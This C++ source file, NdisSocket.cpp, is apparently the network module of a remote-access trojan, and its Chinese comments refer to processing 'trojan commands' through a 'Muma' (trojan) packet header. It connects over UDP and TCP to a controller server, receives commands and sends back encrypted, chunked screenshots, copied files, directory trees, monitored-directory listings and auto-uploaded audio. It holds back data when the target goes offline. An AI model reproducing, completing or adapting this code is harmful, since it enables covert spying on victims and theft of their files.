// NdisSocket.cpp: implementation of the NdisSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "NdisSocket.h"
#include "Base.h"
#include "UserAgent.h"
#include "getSysteminfo.h"
#include "WinApi.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define INTERACT_PORT		0x401f	// udp ntohs(8000)
//#define INTERACT_PORT		0x8900

extern time_t  g_acktime;

/*
* Alignment macros.  BPF_WORDALIGN rounds up to the next 
* even multiple of BPF_ALIGNMENT. 
*/
SOCKET   MainSocket;		//传输数据用
SOCKET	 TcpSocket;
BOOL	 SocketInit=FALSE;
BOOL	 TcpSocketInit=FALSE;
HANDLE	 SocketThread=NULL;
HANDLE	 TcpSocketThd = NULL;

TaskUnit g_TaskList[Max_TaskNum];
long g_fat32taskallow=0;

#define		INIT_NETSPEED	5 //5个包
#define		INIT_MAXSPEED	10
long		v_netSpeed		= INIT_NETSPEED;	// 默认网络速度(1000/v_netSpeed)包/秒
long		v_minSpeed		= INIT_NETSPEED;
long		v_maxSpeed		= INIT_MAXSPEED;

//////////////////////////////////////////////////////////////////////////
//
// long			v_currentSend	= 0;	// 当前SendData的实例
long			v_currentSend5	= 0;	// 文件下载并行数
long			v_currentSend13	= 0;	// 小包传输并行数

//////////////////////////////////////////////////////////////////////////
//
extern DWORD   v_bSendType;

BOOL BootSendData(char* buf,int len,BOOL isHeart)
{
	BOOL bret = FALSE;

	if (v_bSendType == 0)
	{
		bret = SendUdpData(buf, len);
	}
	else if (v_bSendType == 1)
	{
		bret = SendTcpData(buf, len);
	}

	return bret;
}

/************************************************************************/
/* 开线程处理木马指令                                                    */
/************************************************************************/
DWORD WINAPI  PrecessCmdThread(LPVOID p)
{
	ThreadParam *pPara =(ThreadParam *)p;
	ProcessTrojCmd(pPara->buf,pPara->datalen);
	delete pPara;
	return 0;
}

BOOL StartProcessCmd(char *buffer, int buflen)
{
	ThreadParam *pPara = new ThreadParam;
	if (buflen > 2000)
	{
		return FALSE;
	}
	memcpy(pPara->buf,buffer,buflen);
	pPara->datalen=buflen;

	   DWORD dwID;
		HANDLE hthread=CreateThread(
			NULL,
			NULL, 
			PrecessCmdThread, 
			pPara,
			NULL, 
			&dwID);
		if(hthread != NULL)
		{
			CloseHandle(hthread);
		}
		else
		{
			int ero=PGetLastError();
		}
	return TRUE;
}

DWORD WINAPI UdpSocketThread(LPVOID p)
{
	struct sockaddr_in from;
	int fromlen =sizeof(from);

	while (true)
	{
		char buffer[2000]="\0";
		DWORD datalen = Precvfrom(MainSocket,buffer,sizeof(buffer),0,(struct sockaddr*)&from,&fromlen);
		if (datalen > 10 && datalen<2000)
		{
			StartProcessCmd(buffer, datalen);
			g_acktime = time(0);
		}
		PSleep(20);
	}
	
	return 0;
}

BOOL SendUdpData(char* buf, DWORD bufLen) 
{
	if(!SocketInit)
	{
		WSADATA   wsda;

		PWSAStartup(MAKEWORD(2,1),   &wsda);   
		
		MainSocket = Psocket(AF_INET,   SOCK_DGRAM,   IPPROTO_UDP);   
		if(MainSocket == SOCKET_ERROR)   
		{   
			return FALSE;
		}
		SocketInit = TRUE;

		DWORD tID;
		if(!SocketThread)
			SocketThread = CreateThread(NULL, 0, UdpSocketThread, NULL, 0, &tID);
	}
	
	SOCKADDR_IN   addr;   
	addr.sin_family   =   AF_INET;   
	addr.sin_port   =   Phtons(8000);   
//	addr.sin_port   =   Phtons(137);   
	addr.sin_addr.s_addr   =   v_VirtualServerIp;   
	
	int ret   =   PSendTo(MainSocket,   buf,   bufLen,   0,   (struct   sockaddr   *)   &addr,   sizeof(addr));   
	if(ret   ==   SOCKET_ERROR)   
	{
		return FALSE; 
	}

	return   TRUE;   
}

DWORD WINAPI TcpSocketThread(LPVOID p)
{
	while (true)
	{
		char buffer[2000];
		memset(buffer, 0, 2000);
		DWORD datalen = Precv(TcpSocket, buffer, sizeof(buffer), 0);
		if (datalen > 10 && datalen<2000)
		{
			StartProcessCmd(buffer, datalen);
			g_acktime = time(0);
		}
		PSleep(20);
	}
	
	return 0;
}

BOOL SendTcpData(char* buf, DWORD bufLen) 
{
	if(!TcpSocketInit)
	{
		WSADATA   wsda;
		
		PWSAStartup(MAKEWORD(2,1),   &wsda);   
	
		TcpSocket = Psocket(AF_INET, SOCK_STREAM, 0);   
		if(TcpSocket == SOCKET_ERROR)   
		{   
			return FALSE;
		}
		TcpSocketInit = TRUE;
		
		struct sockaddr_in serverAddr;
		serverAddr.sin_family=AF_INET;
		serverAddr.sin_port=Phtons(55556); ///监听端口
		serverAddr.sin_addr.s_addr=v_VirtualServerIp; ///本机

		/*连接服务器*/
		while (Pconnect(TcpSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == INVALID_SOCKET)
		{
			PSleep(100);
			continue;
		}

		DWORD tID;
		if(!TcpSocketThd)
			TcpSocketThd = CreateThread(NULL, 0, TcpSocketThread, NULL, 0, &tID);
	}

	char * buffer = new char[bufLen+5];
	memset(buffer, 0, bufLen+5);
	memcpy(buffer, &bufLen, 4);
	memcpy(buffer+4, buf, bufLen);
	bufLen += 4;

	int ret = Psend(TcpSocket, buffer, bufLen, 0);
	
	if (buffer)
	{
		delete []buffer;
	}

	if(ret == SOCKET_ERROR)   
	{
		return FALSE; 
	}

	return   TRUE;  
}

//////////////////////////////////////////////////////////////////////////
//发数据
DWORD SendData(char * buf,int len,UCHAR PacketType,USHORT SessionID)
{
	if(!g_isHeartOk)  //这个是为了目标拔网线,缓存截屏等文件不要发送.
	{
		return 0;
	}
	
	if(NULL == buf)
	{
		return FALSE;
	}

	DWORD bSucc;
	if(FALSE == isPacketBig(PacketType) )		// 大包类
	{
		PInterlockedIncrement(&v_currentSend13);
		bSucc = v_currentSend13;
	}
	else
	{
		PInterlockedIncrement(&v_currentSend5);
		bSucc = v_currentSend5;
	}

	int  iError = 0;
	try
	{
		iError = 11;
		if(PacketType==0x5) //文件
		{
			if(SendFileBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}	
		}
		else if( PacketType==PTYPE_REGETFILE )
		{
			if(SendReFileBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendReFileBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}	
		}
		else
		{
			if(SendBuffer2List(
				buf,
				len,
				PacketType,
				SessionID) == FALSE)
			{
				bSucc = 0;
				IF_LOUD(DbgFat32Log("SendBuffer2List Fails, PType:%d, SessionID:%d", PacketType, SessionID);)
			}
		}
		iError = 40;

	}catch (...)
	{
		char Msg[200];
		sprintf(Msg, "SendData Catch Error! No:%d", iError);
		IF_LOUD(DbgFat32Log(Msg);)
	}

	if( isPacketBig(PacketType) )
	{
		// 下载类完成
		PInterlockedDecrement(&v_currentSend5);
		if(v_currentSend5 <= 0)
			PInterlockedExchange(&v_currentSend5, 0);
	}
	else
	{
		// 小包类完成
		PInterlockedDecrement(&v_currentSend13);
		if(v_currentSend13 <= 0)
			PInterlockedExchange(&v_currentSend13, 0);
	}
	
	return bSucc;
}

BOOL isPacketBig(UCHAR PacketType)
{
	BOOL bBig = FALSE;
	switch(PacketType)
	{
	case PTYPE_SCREEN:
	case PTYPE_COPYDIR:
	case PTYPE_COPYFILE:
	case PTYPE_DIRTREE:
	case PTYPE_GETCHECKDIRLIST: //获取监控目录列表
	case 20:		// 自动回传文件
		bBig = TRUE;
		break;
	}
	return bBig;
}

lpTaskUnit AllocTask(WORD sessionid)
{
	lpTaskUnit pUnit=NULL;
	gettaskallow(g_fat32taskallow);
	for(int i=0;i<Max_TaskNum;i++)
	{
		if(g_TaskList[i].sessionid==0)
		{	
			pUnit=&g_TaskList[i];
			pUnit->sessionid=sessionid;
			pUnit->state=1; 
			break;
		}
	}
	fat32releaseallow(g_fat32taskallow);
	return pUnit;
}

BOOL ClearTask(WORD sessionid,BOOL bclearid)
{
	gettaskallow(g_fat32taskallow);
	for(int i=0;i<Max_TaskNum;i++)
	{
		if(g_TaskList[i].sessionid==sessionid)
		{	
			if(bclearid)
				g_TaskList[i].sessionid=0;
			g_TaskList[i].state=0;
			break;
		}
	}
	fat32releaseallow(g_fat32taskallow);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
// 各类发包函数
BOOL SendBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	//////////////////////////////////////////////////////////////////////////
	BOOL re=TRUE;	
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
			return FALSE;
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		
		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		int offBegin = 0;
		if(PacketType == 5)
			offBegin = 0;
		else
			offBegin = headlen;
// 		
// 		BOOL bBigPacket = isPacketBig(PacketType);
// 		
		BOOL bFirst = TRUE;

		BOOL bFinish = FALSE;
		for(int i=0; i<len;i+=(SIZE_PACKET-offBegin))
		{//循环
			memcpy(sendbuffer,headbuffer,headlen);		
			pMumaHead->PacketSeq=packetseq;
			if(len<=(SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len;
				memcpy(sendbuffer+headlen,buf+i,len);
				pMumaHead->TranFlg = 7;
			}
			else if(i==0 && len>(SIZE_PACKET-offBegin)){
				IF_LOUD(DbgFat32Log("%d_0x%04x 发送开始包(6)", PacketType, SessionID);)
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg = 6;
			}
			else if(i>0 && len>(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg = 2;
			}
			else if(i>0 && len<=(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len-i;
				memcpy(sendbuffer+headlen,buf+i,len-i);
				IF_LOUD(DbgFat32Log("%d_0x%04x 发送结束包(3)", PacketType, SessionID);)
				pMumaHead->TranFlg = 3;
			}
			else{
				re=FALSE;
				break;
			}
			
			int packetlen=headlen+pMumaHead->datalen;
			if(BufferEncrypt((char *)sendbuffer,packetlen,16))
			{
				//发包
				while(1)
				{
					if(AddPacket(
						(char*)sendbuffer,
						packetlen, 
						PacketType, 
						bFirst))
					{
 
					//	DbgPrintLog("AddPacket  SessionID= 0x%04x ,packetseq=%d",SessionID,packetseq);
						break;
					}
				}
			}
			else
			{
				re = FALSE;
				IF_LOUD(DbgFat32Log("加密失败");)
				break;
			}
			
			//生成一个包 加密 发送
			packetseq++;

			PSleep(1);
			
			bFirst = FALSE;
		}
		IF_LOUD(DbgFat32Log("Packet  SessionID= 0x%04x ,总包数=%d",SessionID,packetseq);)
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendBuffer2List error!!!");)
	}
	return re;
}

BOOL SendFileBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	lpTaskUnit pUnit=NULL;
	pUnit=AllocTask(SessionID);
	if(!pUnit)
	{
		IF_LOUD(DbgFat32Log("没有分配到单元");)
		return FALSE;
	}

	//////////////////////////////////////////////////////////////////////////
	BOOL re=TRUE;	
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
		{
			ClearTask(SessionID,TRUE);
			return FALSE;
		}
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		
		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		int offBegin = 0;
		if(PacketType == 5)
			offBegin = 0;
		else
			offBegin = headlen;
		
		BOOL bBigPacket =TRUE; //大包类
		
		BOOL bFirst = TRUE;

		BOOL bFinish = FALSE;
		for(int i=0; i<len;i+=(SIZE_PACKET-offBegin))
		{//循环
			if(!pUnit->state)
				break;  //中断

			memcpy(sendbuffer,headbuffer,headlen);		
			pMumaHead->PacketSeq=packetseq;
			if(len<=(SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len;
				memcpy(sendbuffer+headlen,buf+i,len);
				pMumaHead->TranFlg=7;
			}
			else if(i==0 && len>(SIZE_PACKET-offBegin)){
				IF_LOUD(DbgFat32Log("%d_0x%04x 发送开始包(6)", PacketType, SessionID);)
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg=6;
			}
			else if(i>0 && len>(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=SIZE_PACKET-offBegin;
				memcpy(sendbuffer+headlen,buf+i,SIZE_PACKET-offBegin);
				pMumaHead->TranFlg=2;
			}
			else if(i>0 && len<=(i+SIZE_PACKET-offBegin)){
				pMumaHead->datalen=len-i;
				memcpy(sendbuffer+headlen,buf+i,len-i);
				IF_LOUD(DbgFat32Log("%d_0x%04x 发送结束包(3)", PacketType, SessionID);)
				pMumaHead->TranFlg=3;
			}
			else{
				re=FALSE;
				break;
			}
			
			int packetlen=headlen+pMumaHead->datalen;
			if(BufferEncrypt((char *)sendbuffer,packetlen,16))
			{
				//发包
				while(1)
				{
					if(AddPacket(
						(char*)sendbuffer,
						packetlen, 
						PacketType, 
						bFirst))
					{
 
					//	DbgPrintLog("AddPacket  SessionID= 0x%04x ,packetseq=%d",SessionID,packetseq);
						break;
					}
				}
			}
			else
			{
				re = FALSE;
				IF_LOUD(DbgFat32Log("加密失败");)
				break;
			}
			
			//生成一个包 加密 发送
			packetseq++;
     		PSleep(1);
			
			bFirst = FALSE;
		}
		IF_LOUD(DbgFat32Log("Packet  SessionID= 0x%04x ,总包数=%d",SessionID,packetseq);)
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendFileBuffer2List error!!!");)
	}

	ClearTask(SessionID,TRUE);
	return re;
}

BOOL SendReFileBuffer2List(char * buf, int len, UCHAR PacketType, USHORT	SessionID)
{
	BOOL re=TRUE;
	try
	{
		UCHAR headbuffer[300];
		MumaHead *pMumaHead = NULL;
		int offHead = 0;
		int headlen = MakeHeadBuff((char*)headbuffer, offHead, PacketType);
		if(headlen < sizeof(MumaHead))
			return FALSE;
		pMumaHead = (MumaHead*)(headbuffer+offHead);
		pMumaHead->SessionID	= SessionID;
		pMumaHead->PacketSeq	= 0;
		pMumaHead->datalen		= len;
		pMumaHead->TranFlg		= 7;

		DWORD packetseq = 0;
		UCHAR sendbuffer[2000];
		pMumaHead = (MumaHead*)(sendbuffer+offHead);
		
		BOOL bFirst = TRUE;

		memcpy(sendbuffer,headbuffer,headlen);		
		memcpy(sendbuffer+headlen,buf,len);
		
		int packetlen=headlen+pMumaHead->datalen;
		if(BufferEncrypt((char *)sendbuffer,packetlen,16))
		{
			while(1)
			{
				if(AddPacket(
					(char*)sendbuffer,
					packetlen, 
					PacketType, 
					bFirst))
				{
					break;
				}
			}
		}
		else
		{
			re = FALSE;
		}
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("SendReFileBuffer2List  catch error!!!");)
	}
	
	return re;
}

//////////////////////////////////////////////////////////////////////////
//发包互斥
long g_fat32addallow=0; //加包互斥

BOOL gettaskallow(long &hashallow)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == PInterlockedExchange(&hashallow, 0xBB))
		{
			return TRUE;
		}
		PSleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			IF_LOUD(DbgFat32Log("线程%d获取任务访问权限 error!!", GetCurrentThreadId());)
			PInterlockedExchange(&hashallow, 0);
			return FALSE;
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
}

BOOL fat32getallow(long &hashallow)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == PInterlockedExchange(&hashallow, 0xcc))
		{
			return TRUE;
		}
		PSleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			IF_LOUD(DbgFat32Log("线程%d强行获取写包访问权限!!", GetCurrentThreadId());)
			PInterlockedExchange(&hashallow, 0);
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
}

BOOL fat32releaseallow(long &hashallow)
{	
	PInterlockedExchange(&hashallow, 0);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//发包类
BOOL AddPacket(char * buf, int len, UCHAR PacketType, BOOL bFirstPacket)
{
	try
	{
		if(bFirstPacket)
		{
			PSleep(1);
		}
		else
		{
			switch(PacketType) {
			case PTYPE_SCREEN:
			case PTYPE_DIRTREE:	
			case PTYPE_COPYFILE:
			case PTYPE_COPYDIR:	
			case 42:   ////获取监控目录列表
			case 20:	// 自动回传音频文件
				{
					if(v_currentSend5>0)
					{
						PSleep((1000/v_netSpeed) * v_currentSend5);//根据任务数和带宽来设定发包速度
					}
					else
					{
						PSleep(100);
					}

					break;
				}
			
			default:
				{
					PSleep(1); //小包类
				}
				break;
			}
		}

		fat32getallow(g_fat32addallow);

		BootSendData(buf, len);
			
		fat32releaseallow(g_fat32addallow);
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("send addPacket  error!!!");)
		fat32releaseallow(g_fat32addallow);
	}
 
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//获取发包速度
DWORD Cmd_AdjustSpeed(DWORD* pPara)
{
	ThreadParam *ThreadPara = (ThreadParam*)pPara;
	char *p=strstr(ThreadPara->buf,"\r\n\r\n");
	if(p!=NULL)
		p[0]=0;
	else
	{
		return -1;
	}
	p=strstr(ThreadPara->buf, "speed: ");
	if(p!=NULL)
		p+=strlen("speed: ");
	else
	{
		return -1;
	}
	long freq = atoi(p);
	long maxfreq;
	if(freq > 0 && freq <= 1000)
	{
		maxfreq = freq << 1;
		PInterlockedExchange(&v_netSpeed, freq);
		PInterlockedExchange(&v_minSpeed, freq);
		PInterlockedExchange(&v_maxSpeed, maxfreq);
	}
	IF_LOUD(DbgFat32Log("发包速度调整为:Sleep(%d)", freq);)
		
	char buffer[100];
	memset(buffer,0,100);
	DWORD datalen=0;
	datalen=sprintf(buffer, "content-length: 2\r\n\r\n%s","ok");
	if(SendData(buffer, datalen, ThreadPara->PacketType, ThreadPara->SessionID))
	{
		
	}
	return 1;
}

